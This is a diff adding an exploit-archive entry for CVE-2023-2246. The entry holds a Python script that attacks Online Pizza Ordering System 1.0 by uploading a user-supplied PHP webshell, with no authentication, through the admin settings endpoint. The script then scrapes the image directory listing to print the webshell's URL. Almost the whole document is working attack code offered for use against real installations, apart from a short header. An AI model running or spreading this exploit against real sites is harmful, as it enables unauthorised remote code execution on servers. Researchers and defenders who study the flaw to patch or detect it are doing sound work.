@@ -1,0 +1,81 @@
+id: 38667
+date: 05/05/2023
+title: Online Pizza Ordering System v1.0 - Unauthenticated File Upload Exploit
+author: URGAN
+cves: CVE-2023-2246
+
+# Exploit Title: Online Pizza Ordering System 1.0 - Unauthenticated File Upload
+# Exploit Author: URGAN 
+# Vendor Homepage: https://www.sourcecodester.com/php/16166/online-pizza-ordering-system-php-free-source-code.html
+# Software Link: https://www.sourcecodester.com/sites/default/files/download/oretnom23/php-opos.zip
+# Version: v1.0
+# Tested on: LAMP Fedora Server 27 (Twenty Seven) Apache/2.4.34 (Fedora) 10.2.19-MariaDB PHP 7.1.23 
+# CVE: CVE-2023-2246
+
+#!/usr/bin/env python3
+# coding: utf-8
+
+import os
+import requests
+import argparse
+from bs4 import BeautifulSoup
+
+# command line arguments
+parser = argparse.ArgumentParser()
+parser.add_argument('-u', '--url', type=str, help='URL with http://')
+parser.add_argument('-p', '--payload', type=str, help='PHP webshell')
+args = parser.parse_args()
+
+# if no arguments are passed, ask the user for them
+if not (args.url and args.payload):
+    args.url = input('Enter URL with http://: ')
+    args.payload = input('Enter file path PHP webshell: ')
+
+# URL Variables
+url = args.url + '/admin/ajax.php?action=save_settings'
+img_url = args.url + '/assets/img/'
+
+filename = os.path.basename(args.payload)
+
+files = [
+  ('img',(filename,open(args.payload,'rb'),'application/octet-stream'))
+]
+
+# send a POST request to the server
+resp_upl = requests.post(url, files = files)
+status_code = resp_upl.status_code
+if status_code == 200:
+    print('[+] File uploaded')
+else:
+    print(f'[-] Error {status_code}: {resp_upl.text}')
+    raise SystemExit(f'[-] Script stopped due to error {status_code}.')
+
+# send a GET request to the server
+resp_find = requests.get(img_url)
+
+# Use BeautifulSoup to parse the page's HTML code
+soup = BeautifulSoup(resp_find.text, 'html.parser')
+
+# get all <a> tags on a page
+links = soup.find_all('a')
+
+# list to store found files
+found_files = []
+
+# we go through all the links and look for the desired file by its name
+for link in links:
+    file_upl = link.get('href')
+    if file_upl.endswith(filename): # uploaded file name
+        print('[+] Uploaded file found:', file_upl)
+        file_url = img_url + file_upl # get the full URL of your file
+        found_files.append(file_url) # add the file to the list of found files
+
+# if the list is not empty, then display all found files
+if found_files:
+    print('[+] Full URL of your file:')
+    for file_url in found_files:
+        print('[+] ' + file_url)
+else:
+    print('[-] File not found')
+
+#  0day.today [2023-05-22]  #
